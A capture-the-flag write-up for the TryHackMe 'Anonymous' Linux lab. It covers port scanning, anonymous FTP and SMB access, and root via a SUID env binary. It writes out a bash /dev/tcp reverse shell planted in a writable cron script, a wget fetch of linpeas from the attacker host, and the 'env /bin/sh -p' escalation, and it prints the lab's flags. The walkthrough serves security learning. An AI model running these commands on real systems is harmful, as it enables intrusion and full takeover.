---
date: 2024-10-22
title: Anonymous THM Write-Up
machine_ip: varies
os: Linux
difficulty: Medium
my_rating: 2
tags:
  - Linux
  - PrivEsc
  - FTP
  - SMB
  - GTFOBins
  - EnvironmentVariables
  - nc
  - rustscan
  - smbclient
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
┌──(root㉿kali)-[~]
└─# rustscan -a 10.10.73.14 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.73.14:21
Open 10.10.73.14:22
Open 10.10.73.14:139
Open 10.10.73.14:445
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.73.14
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 07:48 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:48
Completed NSE at 07:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:48
Completed NSE at 07:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:48
Completed NSE at 07:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 07:48
Completed Parallel DNS resolution of 1 host. at 07:48, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 07:48
Scanning 10.10.73.14 [4 ports]
Discovered open port 22/tcp on 10.10.73.14
Discovered open port 21/tcp on 10.10.73.14
Discovered open port 139/tcp on 10.10.73.14
Discovered open port 445/tcp on 10.10.73.14
Completed SYN Stealth Scan at 07:48, 0.18s elapsed (4 total ports)
Initiating Service scan at 07:48
Scanning 4 services on 10.10.73.14
Completed Service scan at 07:48, 11.52s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.73.14
Retrying OS detection (try #2) against 10.10.73.14
Initiating Traceroute at 07:48
Completed Traceroute at 07:48, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 07:48
Completed Parallel DNS resolution of 2 hosts. at 07:48, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.73.14.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:48
NSE: [ftp-bounce 10.10.73.14:21] PORT response: 500 Illegal PORT command.
Completed NSE at 07:49, 7.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:49
Completed NSE at 07:49, 1.14s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:49
Completed NSE at 07:49, 0.00s elapsed
Nmap scan report for 10.10.73.14
Host is up, received user-set (0.16s latency).
Scanned at 2024-10-23 07:48:38 PDT for 27s

PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 61 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.1.119
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/23%OT=21%CT=%CU=32055%PV=Y%DS=4%DC=T%G=N%TM=67190CE1%P=x86_64-pc-linux-gnu)
SEQ(SP=FD%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 45.810 days (since Sat Sep  7 12:22:05 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-23T14:48:57
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26459/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 33068/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53753/udp): CLEAN (Failed to receive data)
|   Check 4 (port 20904/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-10-23T14:48:57+00:00

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   30.44 ms  10.2.0.1
2   ... 3
4   161.37 ms 10.10.73.14

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:49
Completed NSE at 07:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:49
Completed NSE at 07:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:49
Completed NSE at 07:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
           Raw packets sent: 63 (4.392KB) | Rcvd: 42 (3.160KB)
```
- We find #FTP , #SSH, and #SMB services running.

- #SMB enumeration with #smbclient 
```
 smbclient -U "" -L \\\\10.10.73.14\\    
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
```
- we see a share for `pics`

- Since this box is called "Anonymous" we can assume we can use `anonymous` to log into #FTP 
- It works
```
┌──(root㉿kali)-[~]
└─# ftp anonymous@10.10.73.14                   
Connected to 10.10.73.14.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

- we find a `script`  directory, inside, we find a #bash script called `clean.sh`
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
```
- Let's make this script call a reverse shell since we have `rwx` privileges with it
---
# Foothold

- gain shell via exploit
- `Search-That-Hash`
- Replace the content of `clean.sh` with the following:
```
#!/bin/bash

0<&196;exec 196<>/dev/tcp/10.2.1.119/4242; sh <&196 >&196 2>&196
```

- Start #nc listener and wait for it to run
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.73.14] 43412
whoami
namelessone
```

- We catch a shell and upgrade the tty
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
namelessone@anonymous:~$ pwd
pwd
/home/namelessone
```

- User flag - namelessone
```
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
```

---
# PrivEsc

- escalate to root
- We can use a linux automated escalation suggester tool in a writable directory. So we use #wget and a #SimpleHTTPServer 
```
namelessone@anonymous:~/pics$ wget http://10.2.1.119/linpeas.sh 
wget http://10.2.1.119/linpeas.sh 
--2024-10-23 16:11:53--  http://10.2.1.119/linpeas.sh
Connecting to 10.2.1.119:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 862779 (843K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 842.56K  36.5KB/s    in 33s     

2024-10-23 16:12:27 (25.6 KB/s) - ‘linpeas.sh’ saved [862779/862779]

namelessone@anonymous:~/pics$ ll
ll
total 1156
drwxr-xr-x 2 namelessone namelessone   4096 Oct 23 16:11 ./
drwxr-xr-x 6 namelessone namelessone   4096 May 14  2020 ../
-rw-r--r-- 1 namelessone namelessone  42663 May 12  2020 corgo2.jpg
-rw-rw-r-- 1 namelessone namelessone 862779 Oct 20 20:31 linpeas.sh
-rw-r--r-- 1 namelessone namelessone 265188 May 12  2020 puppos.jpeg
```

- Running #linpeas 
```
namelessone@anonymous:~/pics$ chmod +x linpeas.sh
chmod +x linpeas.sh
namelessone@anonymous:~/pics$ ./linpeas.sh
```

- We find the SUID `/usr/bin/env` executable by the user and runs as root.
```
-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
```
- Using #GTFOBins we can privesc to root
```
namelessone@anonymous:/tmp$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# whoami
whoami
root
```

- Root flag
```
# cat root.txt 
cat root.txt
4d930091c31a622a7ed10f27999af363
```